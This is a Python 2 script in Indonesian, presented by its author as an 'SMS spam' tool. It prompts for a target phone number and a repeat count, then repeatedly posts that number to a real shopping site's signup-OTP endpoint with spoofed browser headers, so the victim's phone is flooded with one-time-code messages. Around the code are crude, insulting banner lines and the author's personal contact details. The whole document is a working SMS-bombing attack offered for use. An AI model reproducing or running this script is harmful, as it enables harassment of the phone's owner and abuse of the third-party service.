# coding: utf-8
import os, sys, time, re, requests, json, random
from time import sleep
M = '\x1b[1;31m'
H = '\x1b[1;32m'
K = '\x1b[1;33m'
U = '\x1b[1;34m'
P = '\x1b[1;35m'
C = '\x1b[1;36m'
W = '\x1b[1;37m'
A = '\x1b[90m'

def mengetik(text):
    for x in text + '\n':
        sys.stdout.write(x)
        sys.stdout.flush()
        sleep(random.random() * 0.2)


def mengetik_3(text):
    for x in text + '\n':
        sys.stdout.write(x)
        sys.stdout.flush()
        sleep(random.random() * 0.3)


def lagi():
    l = raw_input('Mau Spam Lagi? [y/t]: ')
    if l == 'y':
        main()
    elif l == 'n':
        sys.exit()


def main():
    os.system('clear')
    mengetik('\033[1;95mSelamat Datang Di Tools Gua Yang Ga Guna')
    mengetik('Klo Mao Spam Jangan Spam Gua Tai')
    mengetik('Script Ini Akann Limit Njink')
    mengetik('Siapa Juga Yang Susah Lu Juga Kan Tod')
    mengetik('ooo Jadi Elu Yang Blom Subelek Chanell gua')
    mengetik('Subelek dlu lah tod')
    mengetik('Youtube gua TUTORIAL ANDROID')
    print ('Loading...')
    sleep(1.5)
    mengetik(' > > > > > > > > > > > > > > > > > > > > > > > [100℅] ')
    os.system('clear')
    os.system('figlet Spam Sms')
    mengetik_3('\033[1;36m+----------------------------------------+')
    mengetik_3('[•] Author : Mr-S4NTUY  \t\t   [•]')
    mengetik_3('[•] Github : https://github.com/Mr-S4NTUY [•]')
    mengetik_3('[•] whasap : 088294084614                 [•]')
    mengetik_3('[•] Youtub : TUTORIAL ANDROID             [•]')
    mengetik_3('+-----------------------------------------+')
    print ('')
    print ('\x1b[1;32mLoading...')
    sleep(4)
    mengetik('\x1b[1;36mSABAR YA ANJING')
    sleep(4)
    mengetik('\x1b[1;32mEt Bocah Kaga Mao Sabar')
    sleep(4)
    print ('')
    mengetik('\x1b[1;96mGunakan Sc Ini Dengan Bijak Ya')
    print ('')
    print ('\x1b[1;31mEx: 088******')
    nomor = raw_input('\033[1;36m\tNomor Hp Target :')
    jumla = raw_input('\033[1;32m\tJumlah Spam-Nya :')
    r = requests.Session()
    data = {'phone': nomor}
    datajson = json.dumps(data)
    a = 0
    for i in range(int(jumla)):
        try:
            a += 1
            x = r.post('https://cmsapi.mapclub.com/api/signup-otp', data=datajson, headers={'Host': 'cmsapi.mapclub.com', 'Connection': 'Keep-alive', 'Content-Length': '23', 'Accept': 'application/json, text/plain, */*', 'Origin': 'https://www.mapclub.com', 'Save-Data': 'on', 'User-Agent': 'Mozila/5.0 (Linux; Android 8.1.0; vivo 1724) AplleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36', 'Content-type': 'application/json', 'Referer': 'https://www.mapclub.com/id/user/signup', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'id-ID,id;q=0,9,en-US;q=0.8,en;q=0.7,ms;q=0.6,da;q=0.5,pt;q=0.4,jv;q=0.3'})
            if 'ok' in x.text:
                print ('\033[1;36mMengirim') + str(a) + ('\033[1;32mBerhasil Ke No => ') + nomor
            else:
                print ('\033[1;36mMengirim') + str(a) + ('\033[1;32mGagal => ') + nomor
        except requests.exceptions.ConnectionError:
            print ('\033[1;32mCheck Konneksi Interner Lu Njink!!')


main()
lagi()
